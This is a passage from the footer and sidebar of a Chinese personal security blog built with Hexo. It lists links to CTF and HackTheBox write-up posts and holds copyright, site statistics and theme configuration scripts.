<i class="ic i-angle-right"></i> <a href="/categories/ctfshow/web%E5%85%A5%E9%97%A8/" title="分类于 web入门">web入门</a></div><span><a href="/2025/01/15/ctfshow/web-begin/PHP%E7%89%B9%E6%80%A7/" title="PHP特性">PHP特性</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/01/30/penetration/hackthebox/LinkVortex/" title="LinkVortex">LinkVortex</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/penetration/" title="分类于 渗透">渗透</a> <i class="ic i-angle-right"></i> <a href="/categories/penetration/hackthebox/" title="分类于 HTB">HTB</a></div><span><a href="/2025/01/27/penetration/hackthebox/UnderPass/" title="UnderPass">UnderPass</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2025</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">Peppermint @ Peppermintの小窝</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">34k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">31 分钟</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2025/01/18/CTF/BuildCTF/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->